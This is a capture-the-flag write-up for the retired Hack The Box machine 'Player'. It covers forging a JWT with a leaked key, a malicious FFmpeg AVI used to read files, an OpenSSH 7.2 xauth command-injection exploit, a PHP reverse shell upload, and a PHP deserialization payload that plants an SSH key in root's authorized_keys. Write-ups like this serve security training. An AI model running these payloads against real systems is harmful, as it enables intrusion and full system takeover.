# Player

This is the write-up for the box Player that got retired at the 18th January 2020.
My IP address was 10.10.14.21 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.145    player.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/player.nmap 10.10.10.145
```

```markdown
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 d7:30:db:b9:a0:4c:79:94:78:38:b3:43:a2:50:55:81 (DSA)
|   2048 37:2b:e4:31:ee:a6:49:0d:9f:e7:e6:01:e6:3e:0a:66 (RSA)
|   256 0c:6c:05:ed:ad:f1:75:e8:02:e4:d2:27:3e:3a:19:8f (ECDSA)
|_  256 11:b8:db:f3:cc:29:08:4a:49:ce:bf:91:73:40:a2:80 (ED25519)
80/tcp open  http    Apache httpd 2.4.7
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 403 Forbidden
Service Info: Host: player.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Full TCP port scan:
```markdown
nmap -p- -o nmap/player_allports.nmap 10.10.10.145
```
```markdown
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6686/tcp open  unknown
```

Running scripts against port 6686:
```markdown
nmap -p 6686 -sC -sV 10.10.10.145
```
```markdown
PORT     STATE SERVICE VERSION
6686/tcp open  ssh     OpenSSH 7.2 (protocol 2.0)
```

## Checking HTTP (Port 80)

The web page responds with the HTTP code _403 Forbidden_.
Lets search for hidden directories with **Gobuster**:
```
gobuster -u http://10.10.10.145 dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

If finds the directory _/launcher_ that forwards to a custom created website with a counter and the possibility to send an email:

![Website on launcher](player_web-1.png)

In the HTML source is another interesting file called _dee8dc8a47256c64630d803a4c40786c.php_.

Searching for subdomains with **Gobuster** on the hostname _player.htb_:
```
gobuster -u http://player.htb vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o player_subdomains.txt

grep -v 403 player_subdomains.txt
```

It found three subdomains that respond with a HTTP code _200 OK_ and they can be accessed after putting them into the _/etc/hosts_ file:
- dev.player.htb (Status: 200)

![Login prompt on dev.player.htb](player_web-3.png)

- chat.player.htb (Status: 200)

![Chat on chat.player.htb](player_web-2.png)

As _Vincent_ says, it seems like there are potentially sensitive files exposed on their _staging_.

- staging.player.htb (Status: 200)

![Website on staging.player.htb](player_web-4.png)

On _Contact Core Team_ it is possible to fill out a contact form and submit it:

![Contact from on staging.player.htb](player_web-5.png)

When submitting anything, it shows something for less than one second and then forwards to _501.php_ and shows a _501 Internal Server Error_ which is fake as it resolved the PHP page correctly.
Lets send this request to a proxy tool like **Burpsuite** and analyze the step between the submit and the PHP code.

### Analyzing staging.player.htb

The short string that is seen between submitting and _501.php_ shows the following information:
```
(...)
    string(28) "/var/www/staging/contact.php"
(...)
      &string(9) "Cleveland"
(...)
      &string(5) "Glenn"
(...)
      &string(5) "Peter"
(...)
Database connection failed.<html><br />Unknown variable user in /var/www/backup/service_config fatal error in /var/www/staging/fix.php
```

It wants to forward to _/launcher/dee8dc8a47256c64630d803a4c40786e.php_ and in this request is a **JWT Token** in the cookies:
```
Cookie: access=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IkMwQjEzN0ZFMkQ3OTI0NTlGMjZGRjc2M0NDRTQ0NTc0QTVCNUFCMDMifQ.cjGwng6JiMiOWZGz7saOdOuhyr1vad5hAxOJCiM3uzU
```

This **JSON Web Token (JWT)** is separated into three parts by a _dot_ and can be decoded with Base64:

Type and algorithm in first string:
```markdown
echo -n eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 | base64 -d
```
```markdown
{"typ":"JWT","alg":"HS256"}
```

- HS256 = **HMAC with SHA-256**

Data inside of token in second string:
```
echo -n eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IkMwQjEzN0ZFMkQ3OTI0NTlGMjZGRjc2M0NDRTQ0NTc0QTVCNUFCMDMifQ | base64 -d
```
```
{"project":"PlayBuff","access_code":"C0B137FE2D792459F26FF763CCE44574A5B5AB03"}
```

There is an _"access code"_ with 40 characters and thus probably a **SHA1** string.

Signing of token in third string:
```
cjGwng6JiMiOWZGz7saOdOuhyr1vad5hAxOJCiM3uzU
```

We can try to Brute-Force the secret out of it, to generate our own JWT-Token, but lets search for it on the box.

#### Creating JWT Token

We found these two mysterious PHP files with the random names before:
- dee8dc8a47256c64630d803a4c40786e.php
- dee8dc8a47256c64630d803a4c40786c.php

By using those names in a wordlist and scanning with **Gobuster** with the `-d` flag, there is a possibility to find backup files:
```
gobuster -u http://player.htb/launcher dir -w custom-wordlist.txt -d
```

It finds _/dee8dc8a47256c64630d803a4c40786c.php~_ which seems to be a backup file and it contains additional PHP code:
```php
require 'vendor/autoload.php';

use \Firebase\JWT\JWT;

if(isset($_COOKIE["access"]))
{
	$key = '_S0_R@nd0m_P@ss_';
	$decoded = JWT::decode($_COOKIE["access"], base64_decode(strtr($key, '-_', '+/')), ['HS256']);
	if($decoded->access_code === "0E76658526655756207688271159624026011393")
	{
		header("Location: 7F2xxxxxxxxxxxxx/");
	}
	else
	{
		header("Location: index.html");
	}
}
else
{
	$token_payload = [
	  'project' => 'PlayBuff',
	  'access_code' => 'C0B137FE2D792459F26FF763CCE44574A5B5AB03'
	];
	$key = '_S0_R@nd0m_P@ss_';
	$jwt = JWT::encode($token_payload, base64_decode(strtr($key, '-_', '+/')), 'HS256');
	$cookiename = 'access';
	setcookie('access',$jwt, time() + (86400 * 30), "/");
	header("Location: index.html");
}
```

In there is the key in plain-text for the JWT Token:
```
_S0_R@nd0m_P@ss_
```

This code sends us to _index.html_ with the current access code.
But when using the access code _"0E76658526655756207688271159624026011393"_, it will forward to _"7F2xxxxxxxxxxxxx"_, so lets create a new the JWT Token.

I will use the website [jwt.io](https://jwt.io/) to create the JWT token:

![Creating token on jwt.io](player_web-6.png)

New token:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IjBFNzY2NTg1MjY2NTU3NTYyMDc2ODgyNzExNTk2MjQwMjYwMTEzOTMifQ.VXuTKqw__J4YgcgtOdNDgsLgrFjhN1_WwspYNf_FjyE
```

Sending the request to the PHP page with the new cookie:
```
GET /launcher/dee8dc8a47256c64630d803a4c40786c.php HTTP/1.1
Host: player.htb
(...)
Cookie: access=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IjBFNzY2NTg1MjY2NTU3NTYyMDc2ODgyNzExNTk2MjQwMjYwMTEzOTMifQ.VXuTKqw__J4YgcgtOdNDgsLgrFjhN1_WwspYNf_FjyE
```

It responds with a HTTP code _302 Found_ and forwards to _launcher/7F2dcsSdZo6nj3SNMTQ1_, which is the _"PlayBuff"_ application:

![PlayBuff application](player_web-7.png)

### Analyzing PlayBuff application

In this application, it is possible to upload files and after uploading, the link to the file is shown as _launcher/7F2dcsSdZo6nj3SNMTQ1/uploads/293521335.avi_.
So it is expecting **AVI video files** and a popular codec for these files is **FFmpeg**.

On [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS) are different resources to exploit this software.
We can create a malicious _.avi_ file with _gen_avi_bypass.py_ that outputs the contents of _/etc/passwd_:
```
python3 gen_avi_bypass.py file:///etc/passwd passwd.avi
```

After uploading _passwd.avi_ to the application, it shows a link to it that can be downloaded which is a video file that shows the contents of _/etc/passwd_ on the box:

![Contents of /etc/passwd](player_web-8.png)

As we have the ability to read files from the box, the web source code files could have interesting information.
When looking through some filenames gathered from before, some PHP files are not showing anything, so there is some restriction to reading files.

The code of _service_config.php_ contains a plain-text username and password:
```
python3 gen_avi_bypass.py file:///var/www/backup/service_config service_config.avi
```

![Contents of service_config.php](player_web-9.png)

- Username: telegen
- Password: d-bC|jC!2uepS/w

There are three known services that require authentication:
- SSH on port 22
- SSH on port 6686
- _dev.player.htb_

After trying the credentials on all of those, they work on SSH port 6686:
```
ssh -p 6686 telegen@10.10.10.145
```

## Checking SSH (Port 6686)

The shell is a restricted shell that only allows a few commands:
```
telegen:~$ help   
  clear  exit  help  history  lpath  lsudo
```

As none of the commands output anything useful, we should look for exploits for SSH:
```
searchsploit ssh 7.2
```

The **SSH version 7.2** has an authenticated command execution vulnerability:
```
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection
```

Executing the Python script:
```
python 39569.py 10.10.10.145 6686 telegen 'd-bC|jC!2uepS/w'
```

This spawns a shell that allows to write files and read files. Lets show the contents of the PHP files that were not allowed before:
```
#> .readfile /var/www/staging/fix.php
```

This file contains credentials for the user _peter_:
- Username: peter
- Password: CQXpm\z)G5D#%S$y=

After trying the credentials on all three services, they work on _dev.player.htb_.

## Analyzing dev.player.htb

This application seems to be a code management system.
By creating a new project and using the correct path, it shows the source files of _dev.player.htb_:

![Code of dev.player.htb](player_web-10.png)

All those files can be found directly on _dev.player.htb_ and can be tested with the _INSTALL.txt_ for example:
```
http://dev.player.htb/INSTALL.txt
```

By right-clicking on the project name and then _"Upload Files"_ it is possible to upload files so lets upload a PHP reverse shell from the **Laudanum scripts** and browse to it to execute it:
```
http://dev.player.htb/shell.php
```

After the request, the listener on my IP and port 9001 starts a reverse shell connection as _www-data_.
We can switch to _telegen_ as that user has probably more permissions:
```
su -s /bin/bash telegen
```

## Privilege Escalation

To enumerate running processes, the tool [pspy](https://github.com/DominicBreuker/pspy) will be uploaded and used.
```
curl 10.10.14.21/pspy32 -o pspy32

chmod +x pspy32

./pspy32
```

It shows all the processes and commands running and after a while there is one interesting executed command:
```
/usr/bin/php /var/lib/playbuff/buff.php
```

The file contains a `unserialize` call and the class _"playBuff"_ contains one of the magic methods `__wakeup()` that is vulnerable to **PHP Deserialization attack**:
```php
class playBuff
{
        public $logFile="/var/log/playbuff/logs.txt";
        public $logData="Updated";

        public function __wakeup()
        {
                file_put_contents(__DIR__."/".$this->logFile,$this->logData);
        }
}
// (...)
```

Lets create a new PHP file _(unserialize.php)_ that generates the object:
```php
class playBuff
{
        public $logFile="/var/log/playbuff/logs.txt";
        public $logData="Updated";

        public function __construct()
        {
                $this->logFile="../../../../../../root/.ssh/authorized_keys";
                $this->logData="ssh-rsa AAAAB3NzaC1yc2(...)";
        }
}

$obj = new playBuff();
echo serialize($obj);
echo "\n"
```

The variable _logData_ contains a self created SSH public key from `ssh-keygen`.

Running _unserialize.php_:
```
php unserialize.php
```

Object:
```
O:8:"playBuff":2:{s:7:"logFile";s:43:"../../../../../../root/.ssh/authorized_keys";s:7:"logData";s:562:"ssh-rsa AAAAB3NzaC1yc2(...)";}
```

Putting created object into _/var/lib/playbuff/merge.log_:
```
echo 'O:8:"playBuff":2:{s:7:"logFile";s:43:"../../../../../../root/.ssh/authorized_keys";s:7:"logData";s:562:"ssh-rsa AAAAB3NzaC1yc2(...)";}' > /var/lib/playbuff/merge.log
```

After the process runs again, it will put our SSH key into the _authorized_keys_ of root.
When that happened, we can login into the box as root!

```
ssh -i player 10.10.10.145
```
